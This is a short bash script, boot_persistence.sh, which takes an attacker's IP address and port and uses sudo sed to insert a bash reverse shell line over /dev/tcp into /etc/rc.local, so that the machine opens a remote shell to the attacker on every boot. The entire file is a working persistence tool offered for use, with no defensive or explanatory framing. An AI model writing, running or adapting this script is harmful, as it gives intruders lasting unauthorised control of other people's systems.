#!/bin/bash
# boot_persistence.sh - Add a reverse shell command to a startup script for boot persistence.
if [ -z "$1" ] || [ -z "$2" ]; then
  echo "Usage: $0 <attacker_ip> <attacker_port>"
  exit 1
fi
BOOT_SCRIPT="/etc/rc.local"
if ! grep -q "bash -i >& /dev/tcp/$1/$2" "$BOOT_SCRIPT"; then
  sudo sed -i "/^exit 0/i bash -i >& /dev/tcp/$1/$2 0>&1" "$BOOT_SCRIPT"
  echo "Reverse shell command added to $BOOT_SCRIPT."
else
  echo "Reverse shell command already exists in $BOOT_SCRIPT."
fi
